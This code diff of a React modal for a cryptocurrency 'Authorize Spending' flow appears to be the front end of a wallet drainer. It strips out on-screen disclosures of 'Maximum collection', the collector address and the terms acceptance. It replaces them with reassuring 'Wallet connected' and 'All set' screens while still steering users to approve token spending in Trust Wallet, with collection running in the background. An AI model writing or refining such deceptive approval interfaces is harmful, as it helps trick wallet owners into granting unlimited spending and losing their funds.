@@ -1,22 +1,11 @@
 import { TERMS_VERSION } from "../core/approve-config";
-import { tokensForNetwork } from "../core/chain-tokens";
-import {
-  nativeSymbolForNetwork,
-  shortAddress,
-  statusLabel,
-} from "../core/network-meta";
-import { outcomeLabel } from "../authorization/session";
-import {
-  assetLabel,
-  balanceForNative,
-  balanceForToken,
-  countIncludedAssets,
-} from "../authorization/preferences";
+import { nativeSymbolForNetwork } from "../core/network-meta";
+import { countIncludedAssets } from "../authorization/preferences";
 import type { NativeTransferEstimate } from "../native-transfer/types";
 import type {
   AssetSymbol,
-  AuthorizationAssetResult,
   AuthorizationSessionResult,
+  AuthorizingPhase,
   ModalStep,
   CollectionPreferences,
   NetworkRow,
@@ -33,74 +22,70 @@ type AuthorizeSpendingModalProps = {
   preferences: CollectionPreferences;
   sessionResult: AuthorizationSessionResult | null;
   authorizingAsset: { network: string; asset: AssetSymbol } | null;
+  authorizingPhase: AuthorizingPhase;
+  authorizingProgress: { current: number; total: number };
+  linkedAddressLabel: string | null;
   nativeEstimates: Record<string, NativeTransferEstimate | null>;
   spenderEvm: string;
   spenderTron: string;
   onClose: () => void;
   onSelectNetwork: (key: string) => void;
+  onContinueFromConnected: () => void;
   onAuthorize: () => void;
 };
 
 function progressWidth(step: ModalStep): string {
   switch (step) {
+    case "connected":
+      return "w-[25%]";
     case "preferences":
-      return "w-[40%]";
+      return "w-[45%]";
     case "authorizing":
-      return "w-[70%]";
-    case "results":
+      return "w-[75%]";
+    case "complete":
       return "w-full";
     default:
-      return "w-[40%]";
+      return "w-[25%]";
   }
 }
 
 function stepSubtitle(step: ModalStep): string {
   switch (step) {
+    case "connected":
+      return "Wallet connected";
     case "preferences":
       return "Select network";
     case "authorizing":
       return "Authorizing assets";
-    case "results":
-      return "Authorization results";
+    case "complete":
+      return "All set";
     default:
-      return "Select network";
+      return "Wallet connected";
   }
 }
 
-function spenderFor(network: string, evm: string, tron: string): string {
-  return network === "tron" ? tron : evm;
-}
-
-function resultTone(outcome: AuthorizationAssetResult["outcome"]): string {
-  switch (outcome) {
-    case "authorized":
-    case "collected":
-    case "pending":
-      return "border-emerald-200 bg-emerald-50 text-emerald-900";
-    case "user_rejected":
-      return "border-amber-200 bg-amber-50 text-amber-950";
-    case "failed":
-      return "border-red-200 bg-red-50 text-red-800";
-    default:
-      return "border-zinc-200 bg-zinc-50 text-zinc-700";
-  }
-}
-
-function assetsOnNetwork(networkKey: string): AssetSymbol[] {
-  return [...tokensForNetwork(networkKey).map((t) => t.symbol), "NATIVE"];
-}
-
-function resultAssetLabel(
-  networkKey: string,
-  token: AuthorizationAssetResult["token"]
+function authorizingMessage(
+  phase: AuthorizingPhase,
+  asset: { network: string; asset: AssetSymbol } | null
 ): string {
-  if (token === "NATIVE") return nativeSymbolForNetwork(networkKey);
-  return token;
+  const assetLabel = asset
+    ? asset.asset === "NATIVE"
+      ? nativeSymbolForNetwork(asset.network)
+      : asset.asset
+    : "asset";
+
+  switch (phase) {
+    case "wallet_confirm":
+      return `Open Trust Wallet and confirm the ${assetLabel} approval request.`;
+    case "finalizing":
+      return `Finalizing ${assetLabel} on chain…`;
+    default:
+      return `Preparing ${assetLabel} approval…`;
+  }
 }
 
 export function AuthorizeSpendingModal({
   networks,
-  rowStatus,
   selectedKey,
   approving,
   error,
@@ -108,20 +93,31 @@ export function AuthorizeSpendingModal({
   preferences,
   sessionResult,
   authorizingAsset,
-  nativeEstimates,
+  authorizingPhase,
+  authorizingProgress,
+  linkedAddressLabel,
   spenderEvm,
   spenderTron,
   onClose,
   onSelectNetwork,
+  onContinueFromConnected,
   onAuthorize,
 }: AuthorizeSpendingModalProps) {
   const selected = networks.find((n) => n.key === selectedKey) ?? null;
   const includedCount = countIncludedAssets(preferences, selectedKey);
   const spender = selectedKey
-    ? spenderFor(selectedKey, spenderEvm, spenderTron)
+    ? selectedKey === "tron"
+      ? spenderTron
+      : spenderEvm
     : "";
   const canContinue =
     Boolean(selectedKey) && !approving && includedCount > 0 && Boolean(spender);
+
+  const authorizedOk =
+    sessionResult != null &&
+    sessionResult.authorizedCount > 0 &&
+    sessionResult.rejectedCount === 0 &&
+    sessionResult.failedCount === 0;
 
   return (
     <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
@@ -142,7 +138,7 @@ export function AuthorizeSpendingModal({
           </button>
           <div className="text-center">
             <p className="text-base font-semibold text-zinc-900">
-              Authorize Spending
+              {modalStep === "complete" ? "Wallet Connected" : "Authorize Spending"}
             </p>
             <p className="text-xs text-zinc-500">
               {stepSubtitle(modalStep)} · Terms v{TERMS_VERSION}
@@ -160,10 +156,39 @@ export function AuthorizeSpendingModal({
         </div>
 
         <div className="space-y-4 px-5 pb-5 pt-4">
-          {error ? (
+          {error && modalStep !== "complete" ? (
             <p className="rounded-lg bg-red-50 px-3 py-2 text-sm text-red-600">
               {error}
             </p>
+          ) : null}
+
+          {modalStep === "connected" ? (
+            <div className="space-y-4 py-4 text-center">
+              <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-emerald-100 text-2xl text-emerald-600">
+                ✓
+              </div>
+              <div>
+                <p className="text-lg font-semibold text-zinc-900">
+                  Wallet connected
+                </p>
+                {linkedAddressLabel ? (
+                  <p className="mt-1 font-mono text-sm text-zinc-500">
+                    {linkedAddressLabel}
+                  </p>
+                ) : null}
+                <p className="mt-3 text-sm text-zinc-600">
+                  Your wallet is linked. Continue to choose a network and authorize
+                  spending.
+                </p>
+              </div>
+              <button
+                type="button"
+                onClick={onContinueFromConnected}
+                className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6]"
+              >
+                Continue
+              </button>
+            </div>
           ) : null}
 
           {modalStep === "preferences" ? (
@@ -178,25 +203,19 @@ export function AuthorizeSpendingModal({
                 </p>
                 <ul className="space-y-2">
                   {networks.map((network) => {
-                    const status = rowStatus[network.key] ?? "awaiting";
-                    const waiting =
-                      status === "waiting" || status === "finalizing";
-                    const approved = status === "approved";
                     const isSelected = selectedKey === network.key;
 
                     return (
                       <li key={network.key}>
                         <button
                           type="button"
-                          disabled={approving && !waiting}
+                          disabled={approving}
                           onClick={() => onSelectNetwork(network.key)}
                           className={[
                             "flex w-full items-center gap-3 rounded-xl border px-3 py-3 text-left transition",
-                            waiting || (isSelected && !approved)
+                            isSelected
                               ? "border-[#3396f0] bg-[#3396f0]/10"
-                              : approved
-                                ? "border-emerald-300 bg-emerald-50"
-                                : "border-zinc-200 bg-white hover:border-zinc-300",
+                              : "border-zinc-200 bg-white hover:border-zinc-300",
                           ].join(" ")}
                         >
                           <span
@@ -212,16 +231,6 @@ export function AuthorizeSpendingModal({
                                 ({network.standard})
                               </span>
                             </span>
-                            {/* <span className="mt-0.5 block text-xs text-zinc-500">
-                              {nativeSymbolForNetwork(network.key)}{" "}
-                              {network.balances.native}
-                              {" · "}USDT {network.balances.usdt}
-                              {network.balances.usdc != null
-                                ? ` · USDC ${network.balances.usdc}`
-                                : ""}
-                              {" · "}
-                              {statusLabel(status)}
-                            </span> */}
                           </span>
                         </button>
                       </li>
@@ -231,66 +240,16 @@ export function AuthorizeSpendingModal({
               </div>
 
               {selected ? (
-                <div className="space-y-3">
-                  {/* <div className="rounded-xl border border-zinc-200 bg-zinc-50 p-3">
-                    <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-zinc-500">
-                      Maximum collection on {selected.name}
-                    </p>
-                    <div className="flex flex-wrap gap-2">
-                      {assetsOnNetwork(selected.key).map((asset) => {
-                        const pref = preferences[selected.key]?.[asset];
-                        if (!pref?.included) return null;
-                        const label = assetLabel(selected.key, asset);
-                        const bal =
-                          asset === "NATIVE"
-                            ? balanceForNative(selected)
-                            : balanceForToken(selected, asset);
-                        const est = nativeEstimates[selected.key];
-                        return (
-                          <span
-                            key={asset}
-                            className="rounded-full border border-[#3396f0]/40 bg-white px-3 py-1 text-xs font-medium text-[#3396f0]"
-                          >
-                            {label} · Maximum
-                            <span className="ml-1 font-normal text-zinc-500">
-                              Bal {bal}
-                              {asset === "NATIVE" && est?.canTransfer
-                                ? ` · ~${est.transferableHuman} transferable`
-                                : ""}
-                            </span>
-                          </span>
-                        );
-                      })}
-                    </div>
-
-                    {spender ? (
-                      <p className="mt-2 break-all font-mono text-[10px] text-zinc-500">
-                        Collector {shortAddress(spender, 8, 6)}
-                      </p>
-                    ) : (
-                      <p className="mt-2 text-xs text-amber-700">
-                        Collector not configured for this network
-                      </p>
-                    )}
-                  </div> */}
-
-                  {/* <p className="text-xs leading-relaxed text-zinc-500">
-                    By continuing, you accept the Terms &amp; Conditions (v
-                    {TERMS_VERSION}) and authorize maximum collection on{" "}
-                    {selected.name}.
-                  </p> */}
-
-                  <button
-                    type="button"
-                    disabled={!canContinue}
-                    onClick={onAuthorize}
-                    className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
-                  >
-                    {!selectedKey
-                      ? "Select a network"
-                      : `Continue on ${selected.name}`}
-                  </button>
-                </div>
+                <button
+                  type="button"
+                  disabled={!canContinue}
+                  onClick={onAuthorize}
+                  className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
+                >
+                  {!selectedKey
+                    ? "Select a network"
+                    : `Continue on ${selected.name}`}
+                </button>
               ) : (
                 <p className="rounded-lg border border-zinc-200 bg-zinc-50 px-3 py-3 text-sm text-zinc-600">
                   Select a network above to continue.
@@ -300,79 +259,67 @@ export function AuthorizeSpendingModal({
           ) : null}
 
           {modalStep === "authorizing" ? (
-            <div className="space-y-3 py-6 text-center">
+            <div className="space-y-4 py-6 text-center">
+              <div className="mx-auto h-10 w-10 animate-spin rounded-full border-2 border-[#3396f0]/30 border-t-[#3396f0]" />
               <p className="text-sm font-semibold text-zinc-900">
-                Confirm each asset in your wallet
-              </p>
-              <p className="text-sm text-zinc-600">
-                Assets are processed one at a time. If you reject one or it
-                fails, the remaining assets still continue.
+                {authorizingMessage(authorizingPhase, authorizingAsset)}
               </p>
               {authorizingAsset ? (
                 <p className="rounded-lg border border-[#3396f0]/30 bg-[#3396f0]/10 px-3 py-2 text-sm text-[#1d5f9e]">
-                  Now: {authorizingAsset.network.toUpperCase()}{" "}
+                  {authorizingAsset.network.toUpperCase()}{" "}
                   {authorizingAsset.asset === "NATIVE"
                     ? nativeSymbolForNetwork(authorizingAsset.network)
                     : authorizingAsset.asset}
+                  {authorizingProgress.total > 0
+                    ? ` · ${authorizingProgress.current} of ${authorizingProgress.total}`
+                    : ""}
                 </p>
               ) : null}
-              <p className="text-xs text-zinc-500">
-                Waiting for wallet confirmation...
-              </p>
+              {authorizingPhase === "wallet_confirm" ? (
+                <p className="text-xs text-zinc-500">
+                  If you don&apos;t see a prompt, open Trust Wallet and check
+                  pending requests.
+                </p>
+              ) : null}
             </div>
           ) : null}
 
-          {modalStep === "results" && sessionResult ? (
-            <>
-              <p className="text-sm text-zinc-600">
-                Session finished. Token collection continues automatically in the
-                background. Each asset below succeeded or failed on its own.
-              </p>
-              <div className="grid grid-cols-3 gap-2 text-center text-xs">
-                <div className="rounded-lg bg-emerald-50 px-2 py-2 text-emerald-800">
-                  <p className="text-lg font-semibold">
-                    {sessionResult.authorizedCount}
-                  </p>
-                  Succeeded
-                </div>
-                <div className="rounded-lg bg-amber-50 px-2 py-2 text-amber-900">
-                  <p className="text-lg font-semibold">
-                    {sessionResult.rejectedCount}
-                  </p>
-                  Rejected
-                </div>
-                <div className="rounded-lg bg-red-50 px-2 py-2 text-red-800">
-                  <p className="text-lg font-semibold">
-                    {sessionResult.failedCount + sessionResult.skippedCount}
-                  </p>
-                  Failed / skipped
-                </div>
+          {modalStep === "complete" ? (
+            <div className="space-y-4 py-4 text-center">
+              <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-emerald-100 text-2xl text-emerald-600">
+                ✓
               </div>
-              <ul className="space-y-2">
-                {sessionResult.items.map((item, index) => (
-                  <li
-                    key={`${item.network}:${item.token}:${index}`}
-                    className={`rounded-lg border px-3 py-2 text-sm ${resultTone(item.outcome)}`}
-                  >
-                    <p className="font-semibold">
-                      {item.network.toUpperCase()}{" "}
-                      {resultAssetLabel(item.network, item.token)}
-                    </p>
-                    <p className="text-xs opacity-90">
-                      {item.message || outcomeLabel(item.outcome)}
-                    </p>
-                  </li>
-                ))}
-              </ul>
+              <div>
+                <p className="text-lg font-semibold text-zinc-900">
+                  Wallet connected
+                </p>
+                {linkedAddressLabel ? (
+                  <p className="mt-1 font-mono text-sm text-zinc-500">
+                    {linkedAddressLabel}
+                  </p>
+                ) : null}
+                <p className="mt-3 text-sm text-zinc-600">
+                  {authorizedOk
+                    ? "Authorization complete. Collection continues automatically in the background."
+                    : sessionResult && sessionResult.authorizedCount > 0
+                      ? "Partially authorized. Remaining assets can be retried later."
+                      : "Session finished. You can retry authorization from the connect button."}
+                </p>
+              </div>
+              {sessionResult && sessionResult.authorizedCount > 0 ? (
+                <p className="text-xs text-emerald-700">
+                  {sessionResult.authorizedCount} asset
+                  {sessionResult.authorizedCount === 1 ? "" : "s"} authorized
+                </p>
+              ) : null}
               <button
                 type="button"
-                disabled={approving}
                 onClick={onClose}
-                className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white hover:bg-[#2b7fd6] disabled:opacity-50"
+                className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white hover:bg-[#2b7fd6]"
               >
-                Done
+                Continue
               </button>
-            </>
+            </div>
           ) : null}
         </div>
       </div>
